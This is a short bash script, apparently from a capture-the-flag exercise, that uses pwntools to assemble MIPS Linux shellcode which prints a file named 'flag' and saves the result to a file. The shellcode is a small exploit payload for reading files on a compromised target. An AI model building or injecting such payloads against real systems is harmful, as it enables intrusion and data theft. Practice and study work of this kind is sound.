#!/bin/bash -e

python -c "import pwn; pwn.context.arch = 'mips'; open('shellcode', 'w').write(pwn.asm(pwn.shellcraft.mips.linux.cat('flag')))" || exit 0
